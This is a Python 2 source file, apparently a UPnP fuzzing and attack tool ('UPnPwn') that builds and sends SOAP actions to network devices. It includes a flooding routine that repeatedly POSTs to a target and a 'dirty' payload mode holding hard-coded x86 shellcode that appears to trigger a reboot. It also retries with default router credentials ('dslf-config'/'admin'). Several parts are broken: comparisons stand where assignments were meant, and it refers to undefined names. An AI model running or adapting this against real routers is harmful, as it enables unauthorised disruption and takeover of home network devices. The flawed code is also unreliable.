#! /usr/bin/env python 37
import requests
from requests.auth import HTTPDigestAuth
import xml.etree.ElementTree as ET

soap_Envelope_Start = """<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/\"
   s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/\">
   <s:Body>"""
soap_Envelope_End = """</s:Body>
</s:Envelope>"""

class SOAP_Handler:
	def __init__(self, address_String):
		self.address_String = address_String
		self.control_Port = 0
		self.control_URL = ""
		self.root_URL = ""
		self.soap_Envelope_Start = soap_Envelope_Start
		self.soap_Envelope_End = soap_Envelope_End
		self.SOAP_Message = ""

	# SOAP packet creation methods
	def set_Action_Tag_Opener(self, action_Name, service_Name):
		action_Tag_Opener = "<u:"
		action_Tag_Opener += action_Name
		action_Tag_Opener += " xmlns:s=\""
		action_Tag_Opener += service_Name
		action_Tag_Opener += "\">"
		self.action_Tag_Opener = action_Tag_Opener

	def set_Action_Tag_Closer(self, action_Name):
		action_Tag_Closer = "</u:"
		action_Tag_Closer += action_Name
		action_Tag_Closer += ">"
		self.action_Tag_Closer = action_Tag_Closer

	#def 

	def set_Arguments_Body_Spam(self, arguments_List):
		arguments_Body = ""
		num_Arguments_Out = 0
		arguments_Out_List = []
		for entry in arguments_List:
			if entry.direction == "out":
				num_Arguments_Out += 1
				arguments_Out_List.append(entry.name)
				argument_Opener = "<" + entry.name + ">"
				argument_Closer = "</" + entry.name + ">"
			else:
				#user_Input = raw_input("		Enter a value for %s: " % entry.name)
				if "UINT" in entry.datatype.upper():
					user_Input = 99999999999
				else:
					user_Input = "-1"
				argument_Opener = "<" + entry.name + ">"
				argument_Opener += user_Input
				argument_Closer = "</" + entry.name + ">"
			arguments_Body += argument_Opener
			arguments_Body += argument_Closer
		self.arguments_Body = arguments_Body
		self.num_Arguments_Out = num_Arguments_Out
		self.arguments_Out_List = arguments_Out_List

	def set_Arguments_Body(self, arguments_List):
		arguments_Body = ""
		num_Arguments_Out = 0
		arguments_Out_List	 = []
		for entry in arguments_List:
			if entry.direction == "out":
				num_Arguments_Out += 1
				arguments_Out_List.append(entry.name)
				argument_Opener = "<" + entry.name + ">"
				argument_Closer = "</" + entry.name + ">"
			else:
				user_Input = raw_input("		Enter a value for %s: " % entry.name)
				argument_Opener = "<" + entry.name + ">"
				argument_Opener += user_Input
				argument_Closer = "</" + entry.name + ">"
			arguments_Body += argument_Opener
			arguments_Body += argument_Closer
		self.arguments_Body = arguments_Body
		self.num_Arguments_Out = num_Arguments_Out
		self.arguments_Out_List = arguments_Out_List

	def compile_SOAP_Message(self):
		SOAP_Message = ""
		SOAP_Message += self.soap_Envelope_Start
		SOAP_Message += self.action_Tag_Opener
		SOAP_Message += self.arguments_Body
		SOAP_Message += self.action_Tag_Closer
		SOAP_Message += self.soap_Envelope_End
		self.SOAP_Message = SOAP_Message

	def set_Control_URL(self, control_URL):
		self.control_URL = control_URL

	def set_Control_Port(self, control_Port):
		self.control_Port = str(control_Port)
		#self.control_Port = str(37443)

	def set_SOAP_Destination(self):
		destination = "http://"
		destination += str(self.address_String)
		destination += ":"
		destination += self.control_Port
		destination += self.control_URL
		self.destination = destination

	# Send/receive methods
	def parse_SOAP_Response(self, reply_Text):
		reply_Text = reply_Text.strip()
		print "starting"
		reply_Element = ET.fromstring(reply_Text)
		print "started"
		SOAP_Responses = {"" : ""}
		for entry in self.arguments_Out_List:
			print "1"
			for l2 in reply_Element:
				print "2"
				for l3 in l2:
					print l3.tag
			this_Response_Start = reply_Text.find("New" + entry, 1)
			this_Response_Start += len(entry) + 4
			this_Response_End = reply_Text.find(entry, this_Response_Start + 3)
			if this_Response_End == -1:
				SOAP_Responses[entry] = "NULL"
				print "		", entry, ": ", "NULL"
			else:
				this_Response_End -= 5
				this_Response = reply_Text[this_Response_Start : this_Response_End]
				this_Response = this_Response.strip(">")
				SOAP_Responses[entry] = str(this_Response)
				print "		", entry, ": ", this_Response
		return SOAP_Responses

	def flood_SOAP_Message(self, count):
		these_Status_Codes = set()
		x = 0
		failures = 0
		reply = requests.post(self.destination, timeout = 10, data=self.SOAP_Message)
		print "		This packet gets us a status_code: ", reply.status_code
		#print "		With response: ", reply.text
		while x < count:
			#print "		Destination: ", self.destination
			try:
				reply = requests.post(self.destination, timeout = 65535, data=self.SOAP_Message)
				#print "		Posted a packet with status code: ", reply.status_code
				these_Status_Codes.add(reply.status_code)
				if 401 == reply.status_code:
					print "		Trying HTTPDigestAuth!"
					failures += 1
					#reply = requests.post(self.destination, timeout=5, auth=HTTPDigestAuth('dsl-config', 'admin'), data=self.SOAP_Message)
					#print "		Retried with HTTPDigestAuth, status code: ", reply.status_code
				elif 200 == reply.status_code:
					self.parse_SOAP_Response(reply.text)
					pass
			except:
				print "		(!) Failure on packet no. ", x, " of ", count, "."
				failures += 1
				if 401 == reply.status_code:
					reply = requests.post(self.destination, timeout=5, auth=HTTPDigestAuth('dslf-config', 'admin'), data=self.SOAP_Message)
					print "		Retried with HTTPDigestAuth, status code: ", reply.status_code
			x += 1
			#if x % (count/10) == 0:
			#	print "		Have sent ", x, " requests out of ", count
		#print "		Sent ", count, " requests successfully."
		print "\n		", failures, " failed packets, ", count - failures, " successful."
		return these_Status_Codes

	def prepare_Clean_SOAP(self, device, this_Action, this_Service):
		self.set_Action_Tag_Opener(this_Action.name, this_Service.name)
		self.set_Action_Tag_Closer(this_Action.name)
		self.set_Arguments_Body(this_Action.arguments)
		self.set_Control_URL(this_Service.control_URL)
		self.set_Control_Port(device.presentation_Port)
		self.set_SOAP_Destination()
		self.compile_SOAP_Message()

	def prepare_Dirty_SOAP(self, device, this_Action, this_Service):
		self.set_Action_Tag_Opener(this_Action.name, this_Service.name)
		self.set_Action_Tag_Closer(this_Action.name)
		self.set_Arguments_Body(this_Action.arguments)
		self.set_Control_URL(this_Service.control_URL)
		self.set_Control_Port(device.presentation_Port)
		self.set_SOAP_Destination()
		self.compile_SOAP_Message()

	def prepare_Auto_SOAP(self, device, this_Action, this_Service):
		self.set_Action_Tag_Opener(this_Action.name, this_Service.name)
		self.set_Action_Tag_Closer(this_Action.name)
		self.set_Arguments_Body_Spam(this_Action.arguments)
		self.set_Control_URL(this_Service.control_URL)
		self.set_Control_Port(device.presentation_Port)
		self.set_SOAP_Destination()
		self.compile_SOAP_Message()

	def save_SOAP_Message(self, device, this_Action, this_Service):
		name = this_Action.name.replace(" ","_") + "_" + this_Service.name.replace(" ", "_") + "_" + device.device_InfoBundle.deviceType.replace(" ", "_") + "_SOAP.pwn"
		with open(name, 'w') as file:
			file.write(self.SOAP_Message)

	def type_Error_Footprint(self, device, this_Action, this_Service):
		total = 0
		type_List = [ "int", "float", "char", "byte", "string", "bool",  "shellcode" ]
		for service in self.target_Device.service_List:
			for action in service.actions:
				print "		Now testing ", action.name, " in service ", service.name.strip(), " ."
				action.http_Codes = dontDropIt.handle_Some_SOAP(self.target_Device, action, service, "Dirty")
				#if 200 in action.http_Codes:
				dontDropIt.save_SOAP_Message(self.target_Device, action, service)
				total += 1
		print "		Conducted ", total, " tests in total."
		interactable_Count = 0
		h401_count = 0
		h500_count = 0
		for service in self.target_Device.service_List:
			for action in service.actions:
				if 200 in action.http_Codes:
					print "		Action: ", action.name, " in Service: ", service.name, " INTERACTABLE"
					interactable_Count += 1
				elif 401 in action.http_Codes:
					h401_count += 1
				elif 500 in action.http_Codes:
					h500_count += 1
				else:
					pass
					#print "		Action: ", action.name, " in Service: ", service.name, " NOT INTERACTABLE ############"
		print "		Total of ", interactable_Count, " actions interactable from ", total
		print "		Got ", h401_count, " total HTTP 401 Errors and ", h500_count, " total HTTP 500 Errors."


	def handle_Some_SOAP(self, this_Device, this_Action, this_Service, soap_Type):
		print "		Using SOAP type: ", soap_Type	
		these_Status_Codes = set()
		type_List = [ "int", "float", "char", "byte", "string", "bool",  "shellcode" ]
		if soap_Type == "Auto":
			self.prepare_Auto_SOAP(this_Device, this_Action, this_Service)
		elif soap_Type == "Clean":
			self.prepare_Clean_SOAP(this_Device, this_Action, this_Service)
		elif soap_Type == "Dirty":
			for x in range(0, len(type_List)):
				this_Type = type_List[x]
				if this_Type == "int":
					this_Type = "8"
				elif this_Type == "float":
					this_Type = "2.349745"
				elif this_Type == "char":
					this_Type = 'c'
				elif this_Type == "byte":
					this_Type = "\xdb"
				elif this_Type == "string":
					this_Type == "UPnPwn"
				elif this_Type ==  "bool":
					this_Type == "1"
				elif this_Type == "shellcode":
					this_Type == "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
				self.handle_Dirty_SOAP(this_Device, this_Action, this_Service, this_Type)
		try:
			reply = self.send_SOAP_Message()
			replyPrint = ""
			for line in reply.text.splitlines():
				#print "doing a testing"
				line = line.strip()
				line = "		" + line + "\n"
				replyPrint += line
			print replyPrint
			SOAP_Responses = self.parse_SOAP_Response(reply.text)
			these_Status_Codes.add(reply.status_code)
			if reply.status_code == 200:
				for entry, value in SOAP_Responses.items():
					for variable in this_Service.state_Variable_Table.variables:
						if entry.startswith("New"):
							entry = entry.strip("New")
						#print "Now checking ", variable.name.strip(), " against: ", entry.strip(), " ."
						if entry.strip() == variable.name.strip():
							#print "got to the if"
							value.replace("</N", "")
							variable.set_Value(value)
							print "		Set variable:", variable.name
		except:
			print "		Error during SOAP transaction. Check network."
		#SOAP_Responses = self.parse_SOAP_Response(reply.text)
		print  reply.text
		SOAP_Responses = self.parse_SOAP_Response(reply.text)
		return these_Status_Codes

	def handle_Clean_SOAP(self, this_Device, this_Action, this_Service):
		these_Status_Codes = set()
		self.prepare_Clean_SOAP(this_Device, this_Action, this_Service)
		try:
			reply = self.send_SOAP_Message()
			SOAP_Responses = self.parse_SOAP_Response(reply.text)
			these_Status_Codes.add(reply.status_code)
			print "		" + reply.status_code
			if reply.status_code == 200:
				for entry, value in SOAP_Responses.items():
					for variable in this_Service.state_Variable_Table.variables:
						if entry == variable.name:
							variable.set_Value(value)
							print "matched a variable"
		except:
			print "		Error during SOAP transaction. Check network."
		#SOAP_Responses = self.parse_SOAP_Response(reply.text)
		return these_Status_Codes

	def handle_SOAP(self, device, this_Action, this_Service):
		#selection = raw_input("		A = Automatic, else manual > ")
		selection = "A"
		if "D" in selection.upper():
			print "		This is dirty soap!"
		elif "A" in selection.upper():
			self.prepare_Auto_SOAP(device, this_Action, this_Service)
			handle_Clean_SOAP(self, device, this_Action, this_Service)
			print "		This is automatic soap!"
		else:
			handle_Clean_SOAP(self, device, this_Action, this_Service)
			return 0

	def send_SOAP_Message(self):
		try:
			reply = requests.post(self.destination, timeout=5, data=self.SOAP_Message)
		except:
			print "We excepted when POSTing, or when parsing the reply."
		print "		Sent a SOAP Message."
		return reply

	def send_SOAP_Message_Digest(self, uname, password):
		reply = requests.post(self.destination, timeout=5, auth=HTTPDigestAuth(uname, password), data=self.SOAP_Message)
		print "		Sent a SOAP Message using HTTP Digest authentication, username '", uname, "' and password '", password, "'"
		return reply